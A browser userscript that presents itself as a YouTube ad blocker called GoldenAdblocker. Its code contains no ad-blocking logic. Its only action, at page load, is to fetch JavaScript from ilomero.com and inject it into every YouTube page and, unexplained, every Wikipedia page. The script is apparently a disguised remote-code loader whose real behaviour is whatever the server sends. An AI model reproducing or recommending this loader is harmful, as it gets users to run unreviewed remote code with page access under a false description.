// ==UserScript==
// @name         GoldenAdblocker
// @namespace    http://tampermonkey.net/
// @version      1.0.0
// @description  Removes 99% of ads from Youtube :)
// @author       Ilomero.com
// @license      Ilomero.com release inspired by GoodTube
// @updateURL    https://ilomero.com/goldenadblocker/main.js
// @downloadURL  https://ilomero.com/goldenadblocker/main.js
// @match        *://m.youtube.com/*
// @match        *://www.youtube.com/*
// @match        *://youtube.com/*
// @match        *://*.wikipedia.org/*
// @icon         https://ilomero.com/goldenadblocker/favicon.ico
// @run-at       document-start
// ==/UserScript==

(function() {
    fetch('https://ilomero.com/goldenadblocker/main.js')
        .then(res => res.text())
        .then(code => {
            const script = document.createElement('script');
            script.textContent = code;
            document.documentElement.appendChild(script);
        })
        .catch(err => console.error('Failed to load external script:', err));
})();
